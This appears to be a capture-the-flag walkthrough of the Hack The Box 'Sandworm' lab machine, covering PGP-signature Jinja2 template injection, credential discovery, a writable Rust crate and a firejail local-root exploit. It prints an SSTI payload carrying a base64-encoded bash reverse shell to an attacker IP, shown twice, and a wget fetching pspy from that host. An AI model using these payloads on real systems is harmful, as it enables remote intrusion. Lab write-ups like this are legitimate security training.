# Sandworm

Tags: Linux
Level: Medium
Tools: pgp encryption, decryption, cargo, rust file, firejail
Bugs: PGP encryption, 
Status: Done
Date: November 26, 2023

### Nmap

```jsx
└─$ nmap -sC -sV -T4 -oN Namp1000 10.10.11.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-26 16:14 EST
Nmap scan report for 10.10.11.218
Host is up (0.44s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
**22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
**80/tcp  open  http     nginx 1.18.0 (Ubuntu)**
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to **https://ssa.htb/**
**443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)**
|_http-title: Secret Spy Agency | Secret Security Service
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.73 seconds
```

Nmap reveled port 22, 80, 443 is open it has https certificate.

### Enumeration

In SSL certificate it is reveling the user name **atlas@ssa.htb**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled.png)

It is using a PGP (Pretty Good Privacy) encrypting and decrypting personal messages.

They provided guide how to use open-source programs such as KGpg, Kleopatra, OpenPGP

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%201.png)

On the top of the page it has their own public key

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%202.png)

With the Input box try **cross site scripting** and another terminal listen for connection

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%203.png)

After encrypting the message 

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%204.png)

the option ‘-o -’ output to standard out.

Without —armor option their is some unreadable data after —armor option their some meaning full base64 data.

After submitting base64 we got “**Thank you for your submission**”

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%205.png)

After submission message

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%206.png)

It’s **not vulnerable to cross-site scripting**

After that we don’t get any shell back to netcat

We **paste above payload** can see the **data /guide page what’s  we encrypted**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%207.png)

### Sending encrypted message

Generate public key

with option 1.RSA and RSA and option key size default 3072 simply press ENTER, and option how long key show valid selected 0 is key does not expire, asking for name given ashok, email as ashok@test.com, after asking for passphrase given as ashok it saying low secure given option take it anyways,

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%208.png)

The keys we generated, generated keys stored here.

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%209.png)

After submitting the key into public key:

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2010.png)

xclip part will just copy the data into clipboard.

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2011.png)

Created **encrypted.pgp** with Encrypted message

Then It’s decrypted with name and email what we given in previous it’s asking for passphrase.

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2012.png)

### Verify a signature

Creating signed message 

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2013.png)

Paste the **clearsign command with data in signed text** last but one msg command

Pasting the **exported key** in **Public key** box the last command in above snap

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2014.png)

Signature is verified with success

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2015.png)

Trying some this bad - added ashok between **signature 5 line added ashok after 1**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2016.png)

Think website using jinja template.

Generating new keys with payload {{ config }} 

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2017.png)

list the keys

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2018.png)

Put **—clearsign data after generate using {{ config }} in signed test box using** 

Put the —export exported key in **public key box**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2019.png)

Pasting data in two test boxes

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2020.png)

We got the cookies back

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2021.png)

Their is mysql credentials 'mysql://atlas:**GarlicAndOnionZ42**@127.0.0.1:3306/SSA’

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2022.png)

using these credentials SSH login not successful - **atlas:GarlicAndOnionZ42**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2023.png)

Created a payload with reverse shell

using 

[Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2024.png)

Created reverse shell with base64

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2025.png)

Created a payload inserted a above reverse shell in the payload

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2026.png)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2027.png)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2028.png)

The above one is failed because for base64 using the “” thats reason

use like this

```jsx
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS85MDAxIDA+JjEK | base64 -d | bash").read() }}
```

the payload is 

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2029.png)

generate a payload with signed keys

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2030.png)

### User flag

We got the user shell

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2031.png)

I don’t found much interesting information in the /home no user flag.

Trying check /proc directory

This **first pid running**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2032.png)

Information on the /proc/net path

Found TCP open ports

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2033.png)

After some time

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2034.png)

Identifying these ports with python 0x0CEA

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2035.png)

Much enumeration, no nano, echo, in home directory is read only

No executable permission in /dev/shm

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2036.png)

IN home directory enumeration with config file their is httpie file in that sessions inside localhost_5000 inside their is admin.json

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2037.png)

We got shell back with these credential of SSH shell

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2038.png)

### Root flag

Let’s enumerate for root flag

With the mysql credentials above loggin

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2039.png)

It’s look like we can crack using **haskcat example hashes** not found any related ones

 pbkdf2-sha256:260000

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2040.png)

Not found any related hash.

looking atals folder .cargo/registry

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2041.png)

Their is CACHEDIR.TAG updated recently, looking at stats

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2042.png)

Now we can run **Linpeas** but takes lot of time

Try pspy in github https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64Downloa

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2043.png)

Downloaded in shell of silentobserver

wget http://10.10.16.25:1234/pspy64

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2044.png)

Our shell is running on pid=3478.

Sometime their interesting **tipnet**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2045.png)

it is switching directory

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2046.png)

**Cargo is RUST like package manager** look at path

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2047.png)

find any writable files

find . -writable

find . -writable 2>/dev/null

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2048.png)

identifying

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2049.png)

Only run by atlas using SUID permission

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2050.png)

Might we can edit code to get reverse shell of root

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2051.png)

Check how to run rust command 

[Command in std::process - Rust](https://doc.rust-lang.org/std/process/struct.Command.html)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2052.png)

Modify payload add command use std::process::command

copying old payload in ssti one

```jsx
└─$ cat ssti   
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS85MDAxIDA+JjEK | base64 -d | bash").read() }}
```

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2053.png)

The script will run every 90 seconds

**forgot put semicolon after .except; waited for 1 hour trying to change script**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2054.png)

we got shell back with with nc -nlvp 9001

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2055.png)

after running

python shell one liner

```jsx
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

press ctrl+z them shell close.

it will revert background shell **stty raw -echo;fg**

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2056.png)

After running find /. -user 2>/dev/null 

try ssh keys

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2057.png)

pasting keys into reverse shell

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2058.png)

finding the permissions

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2059.png)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2060.png)

Finding exploit

[oss-sec: firejail: local root exploit reachable via --join logic (CVE-2022-31214)](https://seclists.org/oss-sec/2022/q2/188)

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2061.png)

copying the file into shell

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2062.png)

It’s given process id I clicked on the ctrl+z

the in pasted command firejail —join=7079

![Untitled](Sandworm%207c63f253073b46e1b0040559500c3300/Untitled%2063.png)